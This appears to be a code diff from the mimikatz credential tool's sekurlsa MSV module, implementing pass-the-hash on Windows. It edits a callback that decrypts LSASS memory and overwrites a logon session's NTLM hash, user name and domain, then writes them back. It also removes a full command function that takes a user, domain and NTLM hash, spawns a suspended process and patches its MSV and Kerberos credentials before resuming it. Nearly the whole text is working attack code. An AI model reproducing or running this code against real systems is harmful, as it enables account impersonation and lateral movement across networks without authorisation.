@@ -46,12 +46,16 @@ BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKIWI_MSV1_0_PRIMARY
 	{
 		(*pthDataCred->pSecData->lsassLocalHelper->pLsaUnprotectMemory)(pPrimaryCreds, pCredentials->Credentials.Length);
 		RtlZeroMemory(pPrimaryCreds->LmOwfPassword, LM_NTLM_HASH_LENGTH);
+		pPrimaryCreds->isLmOwfPassword = FALSE;
 		RtlCopyMemory(pPrimaryCreds->NtOwfPassword, pthDataCred->pthData->NtlmHash, LM_NTLM_HASH_LENGTH);
+		pPrimaryCreds->isNtOwfPassword = TRUE;
+		RtlZeroMemory(pPrimaryCreds->ShaOwPassword, SHA_DIGEST_LENGTH);
+		pPrimaryCreds->isShaOwPassword = FALSE;
 		RtlCopyMemory((PBYTE) pPrimaryCreds + (ULONG_PTR) pPrimaryCreds->UserName.Buffer, pthDataCred->pthData->UserName, pPrimaryCreds->UserName.Length);
 		RtlCopyMemory((PBYTE) pPrimaryCreds + (ULONG_PTR) pPrimaryCreds->LogonDomainName.Buffer, pthDataCred->pthData->LogonDomain, pPrimaryCreds->LogonDomainName.Length);
 		(*pthDataCred->pSecData->lsassLocalHelper->pLsaProtectMemory)(pPrimaryCreds, pCredentials->Credentials.Length);
 
-		kprintf(L"Data copy MSV1_0   @ %p : ", origBufferAddress->address);
+		kprintf(L"data copy @ %p : ", origBufferAddress->address);
 		if(pthDataCred->pthData->isReplaceOk = kull_m_memory_copy(origBufferAddress, &aLocalMemory, pCredentials->Credentials.Length))
 			kprintf(L"OK !");
 		else PRINT_ERROR_AUTO(L"kull_m_memory_copy");
@@ -63,7 +67,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKIWI_MSV1_0_PRIMARY
 
 BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PKIWI_BASIC_SECURITY_LOGON_SESSION_DATA pData, IN OPTIONAL LPVOID pOptionalData)
 {
-	PMSV1_0_PTH_DATA pthData = (PMSV1_0_PTH_DATA) pOptionalData;
+	PSEKURLSA_PTH_DATA pthData = (PSEKURLSA_PTH_DATA) pOptionalData;
 	MSV1_0_PTH_DATA_CRED credData = {pData, pthData};
 	
 	if(RtlEqualLuid(pData->LogonId, pthData->LogonId))
@@ -72,71 +76,6 @@ BOOL CALLBACK kuhl_m_sekurlsa_enum_callback_msv_pth(IN PKIWI_BASIC_SECURITY_LOGO
 		return FALSE;
 	}
 	else return TRUE;
-}
-
-NTSTATUS kuhl_m_sekurlsa_msv_pth(int argc, wchar_t * argv[])
-{
-	BYTE ntlm[LM_NTLM_HASH_LENGTH] = {0};
-	TOKEN_STATISTICS tokenStats;
-	MSV1_0_PTH_DATA data = {&(tokenStats.AuthenticationId), NULL, NULL, ntlm, FALSE};
-	PCWCHAR szRun, szNTLM;
-	DWORD i, j, dwNeededSize;
-	HANDLE hToken;
-	PROCESS_INFORMATION processInfos;
-
-	if(kull_m_string_args_byName(argc, argv, L"user", &data.UserName, NULL))
-	{
-		if(kull_m_string_args_byName(argc, argv, L"domain", &data.LogonDomain, NULL))
-		{
-			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNTLM, NULL))
-			{
-				kull_m_string_args_byName(argc, argv, L"run", &szRun, L"cmd.exe");
-				if(wcslen(szNTLM) == (LM_NTLM_HASH_LENGTH * 2))
-				{
-					for(i = 0; i < LM_NTLM_HASH_LENGTH; i++)
-					{
-						swscanf_s(&szNTLM[i*2], L"%02x", &j);
-						ntlm[i] = (BYTE) j;
-					}
-					kprintf(L"NTLM\t: "); kull_m_string_wprintf_hex(data.NtlmHash, LM_NTLM_HASH_LENGTH, 0); kprintf(L"\n");
-					kprintf(L"Program\t: %s\n", szRun);
-					if(kull_m_process_create(KULL_M_PROCESS_CREATE_LOGON, szRun, CREATE_SUSPENDED, NULL, LOGON_NETCREDENTIALS_ONLY, data.UserName, data.LogonDomain, L"", &processInfos, FALSE))
-					{
-						kprintf(
-							L"  |  PID  %u\n"
-							L"  |  TID  %u\n",
-							processInfos.dwProcessId, processInfos.dwThreadId);
-						if(OpenProcessToken(processInfos.hProcess, TOKEN_READ, &hToken))
-						{
-							if(GetTokenInformation(hToken, TokenStatistics, &tokenStats, sizeof(tokenStats), &dwNeededSize))
-							{
-								kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart, tokenStats.AuthenticationId.HighPart, tokenStats.AuthenticationId.LowPart);
-								kprintf(L"  \\_ ");
-								kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, &data);
-								kprintf(L"\n");
-								if(data.isReplaceOk)
-								{
-									kprintf(L"  \\_ ");
-									kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, &data);
-									kprintf(L"\n");
-								}
-							} else PRINT_ERROR_AUTO(L"GetTokenInformation");
-							CloseHandle(hToken);
-						} else PRINT_ERROR_AUTO(L"OpenProcessToken");
-						
-						if(data.isReplaceOk)
-							NtResumeProcess(processInfos.hProcess);
-						else
-							NtTerminateProcess(processInfos.hProcess, STATUS_FATAL_APP_EXIT);
-						
-						CloseHandle(processInfos.hThread);
-						CloseHandle(processInfos.hProcess);
-					} else PRINT_ERROR_AUTO(L"CreateProcessWithLogonW");
-				} else PRINT_ERROR(L"ntlm hash length must be 32 (16 bytes)\n");
-			} else PRINT_ERROR(L"Missing argument : ntlm\n");
-		}
-	}
-	return STATUS_SUCCESS;
 }
 
 VOID kuhl_m_sekurlsa_msv_enum_cred(IN PKUHL_M_SEKURLSA_CONTEXT cLsass, IN PVOID pCredentials, IN PKUHL_M_SEKURLSA_MSV_CRED_CALLBACK credCallback, IN PVOID optionalData)
